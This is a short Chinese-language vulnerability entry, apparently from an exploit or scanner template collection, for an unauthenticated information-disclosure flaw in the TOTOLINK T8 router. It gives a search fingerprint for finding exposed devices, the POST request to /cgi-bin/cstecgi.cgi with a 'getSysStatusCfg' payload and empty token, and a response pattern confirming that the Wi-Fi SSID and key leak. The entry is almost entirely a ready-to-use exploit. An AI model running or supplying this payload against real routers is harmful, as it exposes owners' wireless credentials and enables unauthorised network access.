# totolinkT8设置cstecgi.cgigetSysStatusCfg信息泄露漏洞

totolinkT8 ｜ 信息泄露 ｜ —
- **指纹**：`title="TOTOLINK"`
- **请求**：`POST /cgi-bin/cstecgi.cgi HTTP/1.1`

**Payload**
```
"topicurl":"getSysStatusCfg",
"token":""
```
- **响应特征**：200 ^(?=.*?ssid)(?=.*?key).*?$